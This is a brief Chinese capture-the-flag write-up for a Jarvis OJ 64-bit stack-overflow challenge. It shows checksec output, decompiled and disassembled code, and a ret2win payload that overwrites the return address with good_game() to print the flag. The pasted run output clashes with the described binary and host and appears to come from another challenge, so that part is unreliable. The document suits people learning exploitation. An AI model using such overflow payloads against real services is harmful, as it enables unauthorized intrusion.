# Description

nc pwn.jarvisoj.com 9876

# checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
# 溢出方式

goto the func good_game()
```
int good_game()
{
  FILE *v0; // rbx@1
  int result; // eax@3
  char buf; // [sp+Fh] [bp-9h]@2

  v0 = fopen("flag.txt", "r");
  while ( 1 )
  {
    result = fgetc(v0);
    buf = result;
    if ( (_BYTE)result == -1 )
      break;
    write(1, &buf, 1uLL);
  }
  return result;
}
```

溢出点

```
.text:00000000004004E0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000004004E0                 public main
.text:00000000004004E0 main            proc near               ; DATA XREF: _start+1Do
.text:00000000004004E0                 sub     rsp, 88h
.text:00000000004004E7                 mov     edx, 14h        ; n
.text:00000000004004EC                 mov     esi, offset aInputYourMessa ; "Input your message:\n"
.text:00000000004004F1                 mov     edi, 1          ; fd
.text:00000000004004F6                 call    _write
.text:00000000004004FB                 mov     rsi, rsp        ; buf
.text:00000000004004FE                 mov     edx, 100h       ; nbytes
.text:0000000000400503                 xor     edi, edi        ; fd
.text:0000000000400505                 call    _read
.text:000000000040050A                 mov     edx, 29h        ; n
.text:000000000040050F                 mov     esi, offset aIHaveReceivedY ; "I have received your message, Thank you"...
.text:0000000000400514                 mov     edi, 1          ; fd
.text:0000000000400519                 call    _write
.text:000000000040051E                 add     rsp, 88h
.text:0000000000400525                 retn
.text:0000000000400525 main            endp
```

# 构造

payload = 0x88 * "A" + p64(Good_Game)+p64(Good_Game)

不知道为什么，使用pwntools出现了错误？？

```

[+] Opening connection to pwn2.jarvisoj.com on port 9876: Done

------Test Your Memory!-------


mQ3lrr4myP

what???? : 
0x80487e0 
cff flag go go go ...


```

最后使用NC 传了payload